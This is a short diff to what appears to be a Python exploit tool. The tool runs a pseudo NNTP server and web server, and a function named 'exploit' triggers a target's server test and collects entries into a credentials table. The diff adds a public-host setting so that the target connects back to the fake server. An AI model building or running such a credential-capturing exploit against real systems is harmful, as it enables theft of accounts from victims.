@@ -11,6 +11,7 @@ from aiohttp import web
 
 # Local Hostname and Port to bind the psuedo NNTP TCP server
 NNTP_SERVER_LOCAL_HOST = ""    # "" = listen on all available interfaces
+NNTP_SERVER_PUBLIC_HOST = ""   # Your Server or PC's Public IP, or some host that resolves to it
 NNTP_SERVER_LOCAL_PORT = 8119  # 119=non-SSL + 8... = 8119, easier to remember
 
 # Local Hostname and Port to bind the Web Server
@@ -254,7 +255,7 @@ async def exploit(request: web.Request) -> web.Response:
 
         server_ssl_bak = server["ssl"]
         server["ssl"] = False  # required for trigger
-        trigger_call, _ = test_server(NNTP_SERVER_LOCAL_HOST, NNTP_SERVER_LOCAL_PORT)
+        trigger_call, _ = test_server(NNTP_SERVER_PUBLIC_HOST, NNTP_SERVER_LOCAL_PORT)
         server["ssl"] = server_ssl_bak
 
         credentials[target.split(":")[0]][-1].update(server)
